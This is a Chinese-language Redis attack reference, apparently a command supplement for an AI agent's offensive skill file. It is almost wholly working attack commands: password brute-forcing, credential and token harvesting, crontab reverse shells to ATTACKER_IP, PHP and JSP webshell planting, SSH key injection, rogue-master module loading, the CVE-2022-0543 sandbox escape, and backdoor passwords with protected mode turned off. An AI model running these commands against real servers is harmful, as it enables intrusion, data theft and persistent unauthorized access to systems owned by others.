# Redis 攻击技术参考

> 本文档是 SKILL.md 各 Phase 的详细命令与技术补充。

---

## 1. 未授权访问与弱口令

### 利用条件
- Redis 监听在 0.0.0.0（默认配置）
- 未设置 `requirepass` 或使用弱密码
- 6379 端口可达（无防火墙拦截）

### 连接测试

```bash
# 无密码直连
redis-cli -h TARGET -p 6379 PING
# 返回 PONG 即为未授权

# Nmap 信息收集
nmap -p 6379 --script redis-info TARGET

# 版本与系统信息
redis-cli -h TARGET -p 6379 INFO server
```

### 弱口令尝试

```bash
# 常见默认密码列表
redis-cli -h TARGET -p 6379 -a redis PING
redis-cli -h TARGET -p 6379 -a password PING
redis-cli -h TARGET -p 6379 -a 123456 PING
redis-cli -h TARGET -p 6379 -a admin PING
redis-cli -h TARGET -p 6379 -a root PING
redis-cli -h TARGET -p 6379 -a test PING
redis-cli -h TARGET -p 6379 -a guest PING
redis-cli -h TARGET -p 6379 -a default PING
```

### 爆破工具

```bash
# Hydra
hydra -P passwords.txt redis://TARGET

# Nmap 内置爆破
nmap --script redis-brute -p 6379 TARGET

# Medusa
medusa -h TARGET -P passwords.txt -M redis

# Metasploit
msf> use auxiliary/scanner/redis/redis_login
msf> set RHOSTS TARGET
msf> set PASS_FILE /path/to/passwords.txt
msf> run
```

**攻击效果**: 获得 Redis 完全控制权限，可进行后续所有攻击操作。

---

## 2. 数据窃取

### 利用条件
- 已获得 Redis 访问权限（未授权或已知密码）
- 目标 Redis 中存储有业务数据

### 基础枚举

```bash
# 查看数据库使用情况
redis-cli -h TARGET -p 6379 INFO keyspace

# 切换数据库（默认 16 个，编号 0-15）
redis-cli -h TARGET -p 6379 SELECT 0
redis-cli -h TARGET -p 6379 SELECT 1

# 查看当前数据库键数量
redis-cli -h TARGET -p 6379 DBSIZE

# 列出所有键（小数据库可用）
redis-cli -h TARGET -p 6379 KEYS "*"
```

### 敏感键搜索

```bash
# 按关键词搜索
redis-cli -h TARGET -p 6379 KEYS "*password*"
redis-cli -h TARGET -p 6379 KEYS "*passwd*"
redis-cli -h TARGET -p 6379 KEYS "*secret*"
redis-cli -h TARGET -p 6379 KEYS "*token*"
redis-cli -h TARGET -p 6379 KEYS "*session*"
redis-cli -h TARGET -p 6379 KEYS "*api_key*"
redis-cli -h TARGET -p 6379 KEYS "*credential*"
redis-cli -h TARGET -p 6379 KEYS "*auth*"
redis-cli -h TARGET -p 6379 KEYS "*user*"
redis-cli -h TARGET -p 6379 KEYS "*admin*"
```

### 大数据库安全遍历（SCAN 替代 KEYS）

```bash
# SCAN 不会阻塞 Redis，适合生产环境
redis-cli -h TARGET -p 6379 SCAN 0 MATCH "*password*" COUNT 100
redis-cli -h TARGET -p 6379 SCAN 0 MATCH "*token*" COUNT 100
redis-cli -h TARGET -p 6379 SCAN 0 MATCH "*session*" COUNT 100

# 持续遍历（cursor 不为 0 时继续）
redis-cli -h TARGET -p 6379 SCAN <cursor> MATCH "*" COUNT 1000
```

### 按类型提取数据

```bash
# 先确定键类型
redis-cli -h TARGET -p 6379 TYPE keyname

# String 类型
redis-cli -h TARGET -p 6379 GET keyname

# Hash 类型（常存储用户对象）
redis-cli -h TARGET -p 6379 HGETALL keyname
redis-cli -h TARGET -p 6379 HKEYS keyname
redis-cli -h TARGET -p 6379 HGET keyname fieldname

# List 类型
redis-cli -h TARGET -p 6379 LRANGE keyname 0 -1

# Set 类型
redis-cli -h TARGET -p 6379 SMEMBERS keyname

# Sorted Set 类型
redis-cli -h TARGET -p 6379 ZRANGE keyname 0 -1 WITHSCORES

# 序列化导出
redis-cli -h TARGET -p 6379 DUMP keyname
```

### 实时监控（捕获凭据）

```bash
# 实时监控所有命令（可捕获 AUTH 密码、SET 敏感数据）
redis-cli -h TARGET -p 6379 MONITOR

# 慢查询日志
redis-cli -h TARGET -p 6379 SLOWLOG GET 25
```

**攻击效果**: 获取存储在 Redis 中的密码、Token、Session 数据，可能用于横向移动或权限提升。

---

## 3. CONFIG SET 系列 RCE

### 3.1 Crontab 写入（Linux 反弹 Shell）

#### 利用条件
- Redis 以 root 权限运行
- `CONFIG SET` 未被禁用/重命名
- 目标为 Linux 系统
- 目标 cron 服务正在运行

#### 完整命令

```bash
# CentOS/RHEL 路径
redis-cli -h TARGET -p 6379
> SET cron "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SAVE

# Ubuntu/Debian 路径
redis-cli -h TARGET -p 6379
> SET cron "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
> CONFIG SET dir /var/spool/cron/crontabs/
> CONFIG SET dbfilename root
> SAVE
```

一行式写法:

```bash
echo -e "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n" | redis-cli -h TARGET -p 6379 -x set cron
redis-cli -h TARGET -p 6379 CONFIG SET dir /var/spool/cron/
redis-cli -h TARGET -p 6379 CONFIG SET dbfilename root
redis-cli -h TARGET -p 6379 SAVE
```

**关键判断**: 等待最多 1 分钟收到反弹 Shell。如果未收到，检查 cron 路径是否正确、Redis 是否以 root 运行。

### 3.2 Webshell 写入

#### 利用条件
- 目标运行 Web 服务（Apache/Nginx）
- 已知 Web 根目录路径
- `CONFIG SET` 未被禁用
- Web 目录对 Redis 进程可写

#### PHP Webshell

```bash
redis-cli -h TARGET -p 6379
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET payload "<?php @eval($_POST['cmd']);?>"
> SAVE
```

常见 Web 根目录:

```
/var/www/html
/usr/share/nginx/html
/var/www
/opt/lampp/htdocs
/usr/local/apache2/htdocs
```

#### JSP Webshell

```bash
redis-cli -h TARGET -p 6379
> CONFIG SET dir /usr/local/tomcat/webapps/ROOT
> CONFIG SET dbfilename shell.jsp
> SET payload "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
> SAVE
```

#### 验证

```bash
# PHP
curl "http://TARGET/shell.php" -d "cmd=id"

# 或直接访问确认文件存在
curl -I "http://TARGET/shell.php"
```

**攻击效果**: 获得 Web 服务器权限的命令执行能力。

### 3.3 SSH 公钥注入

#### 利用条件
- 目标运行 SSH 服务
- Redis 进程对目标用户 `.ssh` 目录有写权限
- `CONFIG SET` 未被禁用

#### 完整步骤

```bash
# 步骤 1: 在攻击机生成密钥对
ssh-keygen -t rsa -f /tmp/redis_rsa -N ""

# 步骤 2: 格式化公钥（前后加换行，避免 Redis 二进制数据干扰）
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/spaced_key.txt

# 步骤 3: 导入公钥到 Redis
cat /tmp/spaced_key.txt | redis-cli -h TARGET -p 6379 -x set ssh_key

# 步骤 4: 写入 authorized_keys
redis-cli -h TARGET -p 6379 CONFIG SET dir /var/lib/redis/.ssh
redis-cli -h TARGET -p 6379 CONFIG SET dbfilename authorized_keys
redis-cli -h TARGET -p 6379 SAVE

# 步骤 5: SSH 登录
ssh -i /tmp/redis_rsa redis@TARGET
```

#### 其他用户路径探测

```bash
# 测试不同用户的 home 目录是否可写
redis-cli -h TARGET -p 6379 CONFIG SET dir /root/.ssh
redis-cli -h TARGET -p 6379 CONFIG SET dir /home/www/.ssh
redis-cli -h TARGET -p 6379 CONFIG SET dir /home/ubuntu/.ssh
redis-cli -h TARGET -p 6379 CONFIG SET dir /home/admin/.ssh
# 返回 OK 说明目录存在且可写
```

**攻击效果**: 获得 SSH 免密登录权限，通常为 redis 用户或 root 用户。

---

## 4. 主从复制 RCE

### 利用条件
- Redis >= 4.0（支持 MODULE LOAD）
- `SLAVEOF` / `REPLICAOF` 命令可用
- 攻击机与目标网络可达

### 自动化利用 (redis-rogue-server)

```bash
# 下载工具
git clone https://github.com/n0b0dyCN/redis-rogue-server
cd redis-rogue-server

# 交互式 Shell
python3 redis-rogue-server.py --rhost TARGET --rport 6379 --lhost ATTACKER_IP

# 反弹 Shell
python3 redis-rogue-server.py --rhost TARGET --rport 6379 --lhost ATTACKER_IP --revshell
```

### 手动利用流程

```bash
# 步骤 1: 编译恶意模块
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand && make
# 生成 module.so

# 步骤 2: 在攻击机启动恶意 Redis Master（加载模块数据）
# 步骤 3: 让目标成为 Slave
redis-cli -h TARGET -p 6379 SLAVEOF ATTACKER_IP 6379

# 步骤 4: 等待同步完成，模块文件传输到目标
redis-cli -h TARGET -p 6379 MODULE LOAD /tmp/module.so

# 步骤 5: 执行命令
redis-cli -h TARGET -p 6379 system.exec "id"
redis-cli -h TARGET -p 6379 system.exec "whoami"
redis-cli -h TARGET -p 6379 system.rev ATTACKER_IP 9999

# 步骤 6: 清理
redis-cli -h TARGET -p 6379 MODULE UNLOAD mymodule
redis-cli -h TARGET -p 6379 SLAVEOF NO ONE
```

### 原理说明

1. 攻击者启动一个恶意 Redis Master
2. 让目标 Redis 执行 `SLAVEOF` 成为攻击者的 Slave
3. 通过主从复制协议将恶意 `.so` 模块传输到目标
4. 目标加载模块，获得任意命令执行能力

**攻击效果**: 获得 Redis 进程权限的任意命令执行。

---

## 5. 模块加载 RCE

### 利用条件
- Redis >= 4.0（引入 MODULE 命令）
- 恶意 `.so` 已上传到目标文件系统（通过主从复制、文件上传漏洞等）
- `MODULE LOAD` 命令未被禁用

### 恶意模块编译

```bash
# RedisModules-ExecuteCommand
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand
make
# 输出: module.so
```

### 加载与执行

```bash
# 加载模块
redis-cli -h TARGET -p 6379 MODULE LOAD /path/to/module.so

# 查看已加载模块
redis-cli -h TARGET -p 6379 MODULE LIST

# 执行系统命令
redis-cli -h TARGET -p 6379 system.exec "id"
redis-cli -h TARGET -p 6379 system.exec "cat /etc/passwd"
redis-cli -h TARGET -p 6379 system.exec "whoami"

# 反弹 Shell
redis-cli -h TARGET -p 6379 system.rev ATTACKER_IP 9999

# 卸载模块（清理）
redis-cli -h TARGET -p 6379 MODULE UNLOAD mymodule
```

**攻击效果**: 完全的命令执行能力，权限等同于 Redis 进程用户。

---

## 6. Lua 脚本注入

### 利用条件
- `EVAL` 命令可用
- CVE-2022-0543: 仅 Debian/Ubuntu 系统，Redis < 特定修补版本

### CVE-2022-0543 沙箱逃逸 (Debian/Ubuntu)

```bash
# 执行任意系统命令
redis-cli -h TARGET -p 6379 EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0

# 读取文件
redis-cli -h TARGET -p 6379 EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.open("/etc/passwd", "r"); local res = f:read("*a"); f:close(); return res' 0

# 反弹 Shell
redis-cli -h TARGET -p 6379 EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"); return "ok"' 0
```

### 常规 Lua EVAL（沙箱内）

```bash
# 批量键操作（沙箱内，无法执行系统命令）
redis-cli -h TARGET -p 6379 EVAL "return redis.call('KEYS', '*')" 0

# 批量数据提取
redis-cli -h TARGET -p 6379 EVAL "local keys = redis.call('KEYS', '*password*'); local result = {}; for i, key in ipairs(keys) do result[i] = key .. '=' .. tostring(redis.call('GET', key)) end; return result" 0

# 从文件执行 Lua 脚本
redis-cli -h TARGET -p 6379 --eval script.lua
```

**攻击效果**: CVE-2022-0543 可获得完全命令执行能力；常规 EVAL 仅能进行 Redis 内数据操作。

---

## 7. Pub/Sub 窃听

### 利用条件
- 已获得 Redis 访问权限
- 目标应用使用 Redis Pub/Sub 功能

### 窃听命令

```bash
# 监听所有频道（通配符匹配）
redis-cli -h TARGET -p 6379 PSUBSCRIBE "*"

# 监听特定频道
redis-cli -h TARGET -p 6379 SUBSCRIBE channel_name

# 监听特定模式
redis-cli -h TARGET -p 6379 PSUBSCRIBE "user:*"
redis-cli -h TARGET -p 6379 PSUBSCRIBE "order:*"
redis-cli -h TARGET -p 6379 PSUBSCRIBE "auth:*"

# 列出当前活跃频道
redis-cli -h TARGET -p 6379 PUBSUB CHANNELS "*"

# 查看频道订阅者数量
redis-cli -h TARGET -p 6379 PUBSUB NUMSUB channel1 channel2
```

### 向频道注入消息

```bash
# 向特定频道发布消息（可能干扰业务逻辑）
redis-cli -h TARGET -p 6379 PUBLISH channel_name "injected_message"
```

**攻击效果**: 实时窃听应用间消息通信，可能获取敏感数据、命令指令等。

---

## 8. 配置篡改

### 利用条件
- 已获得 Redis 访问权限
- `CONFIG SET` / `CONFIG GET` 命令可用

### 读取配置

```bash
# 获取全部配置
redis-cli -h TARGET -p 6379 CONFIG GET "*"

# 获取认证配置
redis-cli -h TARGET -p 6379 CONFIG GET requirepass
redis-cli -h TARGET -p 6379 CONFIG GET masterauth

# 获取绑定地址
redis-cli -h TARGET -p 6379 CONFIG GET bind

# 获取数据目录
redis-cli -h TARGET -p 6379 CONFIG GET dir
redis-cli -h TARGET -p 6379 CONFIG GET dbfilename

# 获取日志配置
redis-cli -h TARGET -p 6379 CONFIG GET logfile

# 检查危险命令是否被重命名（注意：rename-command 不可通过 CONFIG GET 获取，
# 此命令会返回空——需查看 redis.conf 文件或通过尝试执行命令来判断）
redis-cli -h TARGET -p 6379 CONFIG GET rename-command
```

### 篡改配置

```bash
# 设置/修改密码（建立后门访问）
redis-cli -h TARGET -p 6379 CONFIG SET requirepass "backdoor_pass"

# 关闭保护模式
redis-cli -h TARGET -p 6379 CONFIG SET protected-mode no

# 修改绑定地址（扩大攻击面）
redis-cli -h TARGET -p 6379 CONFIG SET bind "0.0.0.0"

# 写入配置到文件（持久化配置修改）
redis-cli -h TARGET -p 6379 CONFIG REWRITE
```

**关键判断**: CONFIG REWRITE 会将当前内存中的配置写回 redis.conf，使修改在重启后仍然生效。

---

## 9. 持久化文件利用

### 利用条件
- 已获得 Redis 访问权限或可访问目标文件系统
- 目标 Redis 启用了 RDB 或 AOF 持久化

### RDB 文件获取与分析

```bash
# 获取持久化文件路径
redis-cli -h TARGET -p 6379 CONFIG GET dir
redis-cli -h TARGET -p 6379 CONFIG GET dbfilename

# 触发 RDB 持久化
redis-cli -h TARGET -p 6379 BGSAVE

# 检查持久化状态
redis-cli -h TARGET -p 6379 LASTSAVE

# 如果可访问文件系统，直接复制 RDB 文件
# 默认路径通常为 /var/lib/redis/dump.rdb
```

### rdbtools 解析

```bash
# 安装 rdbtools
pip install rdbtools python-lzf

# 导出为 JSON 格式
rdb --command json /path/to/dump.rdb > dump.json

# 导出特定数据库
rdb --command json -n 0 /path/to/dump.rdb

# 导出内存报告
rdb --command memory /path/to/dump.rdb > memory.csv

# 按键名过滤导出
rdb --command json -k "password" /path/to/dump.rdb
rdb --command json -k "secret" /path/to/dump.rdb
rdb --command json -k "token" /path/to/dump.rdb
```

### AOF 文件分析

```bash
# AOF 文件为文本格式，直接搜索敏感内容
grep -i "password\|secret\|token\|auth" /path/to/appendonly.aof

# 查看 AOF 文件是否启用
redis-cli -h TARGET -p 6379 CONFIG GET appendonly
redis-cli -h TARGET -p 6379 CONFIG GET appendfilename
```

### 通过主从复制 SYNC 获取数据

```bash
# SYNC 命令触发全量数据同步，返回 RDB 格式数据
redis-cli -h TARGET -p 6379 SYNC
# 捕获返回的二进制数据即为 RDB dump
```

**攻击效果**: 离线分析 Redis 全部数据，绕过在线查询可能触发的告警。

---

## 工具清单

| 工具 | 地址 | 用途 |
|------|------|------|
| redis-cli | Redis 官方自带 | Redis 客户端，所有操作的基础 |
| redis-rogue-server | https://github.com/n0b0dyCN/redis-rogue-server | 主从复制自动化 RCE |
| RedisModules-ExecuteCommand | https://github.com/n0b0dyCN/RedisModules-ExecuteCommand | 恶意 .so 模块编译 |
| rdbtools | https://github.com/sripathikrishnan/redis-rdb-tools | RDB 文件解析与分析 |
| Redis-Server-Exploit | https://github.com/Avinash-acid/Redis-Server-Exploit | SSH 公钥自动写入 |
| redis-rce-ssh | https://github.com/captain-woof/redis-rce-ssh | 用户名字典 + authorized_keys 覆盖 |
